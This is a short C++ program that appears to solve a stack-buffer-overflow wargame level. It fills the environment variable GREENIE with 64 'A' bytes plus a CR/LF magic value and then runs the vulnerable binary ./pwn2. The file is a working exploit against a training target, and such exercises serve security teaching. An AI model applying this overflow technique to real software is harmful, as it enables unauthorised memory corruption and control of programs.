#include <iostream>
#include <stdlib.h>


int main()
{
    char special_char[4]{ '\x0d','\x0a','\x0d','\x0a' }; 
    std::string payload;
    int i{ 4 };
    for (int j = 0; j < 64; j++) payload.push_back('A');

    do
    {
        i--;
        payload.push_back(special_char[i]);
    } while (i > 0);
    
    setenv("GREENIE",payload.c_str(),0);

    char *value = getenv("GREENIE");
    system("./pwn2");
    return 0;
}
